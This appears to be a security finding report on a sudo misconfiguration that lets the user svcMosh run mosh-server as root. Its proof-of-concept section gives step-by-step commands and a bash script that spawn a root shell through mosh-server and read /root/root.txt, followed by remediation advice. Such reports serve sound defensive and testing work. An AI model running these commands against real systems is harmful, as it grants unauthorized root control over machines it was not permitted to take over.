# Privilege Escalation via Sudo Misconfiguration of mosh-server

**ID:** vuln-0002
**Severity:** HIGH
**Found:** 2026-03-06 20:11:44 UTC
**Target:** SSH / sudoers
**Endpoint:** /usr/bin/mosh-server
**CWE:** CWE-269
**CVSS:** 7.8

## Description

The system is configured to allow the user `svcMosh` to run the `/usr/bin/mosh-server` binary as root without a password via sudo. Because `mosh-server` allows users to specify custom execution environments and commands, an attacker can leverage this misconfiguration to spawn a root shell.

## Impact

An attacker with standard user privileges (`svcMosh`) can escalate their privileges to root, granting them full control over the affected system.

## Technical Analysis

Upon obtaining access as the user `svcMosh`, the `sudo -l` command reveals the following permissions:
```
User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

The `mosh-server` binary can be executed to instantiate a new Mosh session. It accepts arbitrary commands to be executed as part of the session initialization by appending `-- COMMAND...`.
By running `sudo mosh-server new -c 256 -p 12345 -- /bin/bash`, the server will spawn and detach, outputting a connection key (e.g., `MOSH CONNECT 12345 [KEY]`). The attacker can then use the local `mosh-client` and connect to the locally bound port providing the generated key via the `MOSH_KEY` environment variable, effectively dropping into a root shell.

## Proof of Concept

1. Gain SSH access as user `svcMosh`.
2. Verify sudo permissions by running `sudo -l`.
3. Start the mosh-server as root using sudo, specifying a custom port and command to spawn a root shell:
   `sudo mosh-server new -c 256 -p 12345 -- /bin/bash`
4. The command will output a connection string such as `MOSH CONNECT 12345 <KEY>`. Copy the `<KEY>`.
5. Connect to the local server with the `mosh-client` to interact with the newly spawned root shell:
   `MOSH_KEY="<KEY>" mosh-client 127.0.0.1 12345`
6. Execute `id` or `cat /root/root.txt` to confirm root access.

```
#!/bin/bash
# Assuming the user is already logged in via SSH as svcMosh

# Start mosh-server as root on port 12345 and spawn /bin/bash
OUTPUT=$(sudo mosh-server new -c 256 -p 12345 -- /bin/bash)
echo "$OUTPUT"

# Extract the key
KEY=$(echo "$OUTPUT" | grep -oP 'MOSH CONNECT 12345 \K.*')
echo "Extracted key: $KEY"

# Connect using mosh-client
echo "Run this command to get a root shell:"
echo "MOSH_KEY=\"$KEY\" mosh-client 127.0.0.1 12345"
```

## Remediation

1. Remove the sudo privilege that allows `svcMosh` to run `/usr/bin/mosh-server` without a password.
2. If `svcMosh` requires elevated privileges for specific operations, restrict them to minimal, specifically-tailored scripts or binaries that do not allow arbitrary command execution.
3. Regularly audit `/etc/sudoers` and local sudoers configuration files for excessive or unnecessary privileges.
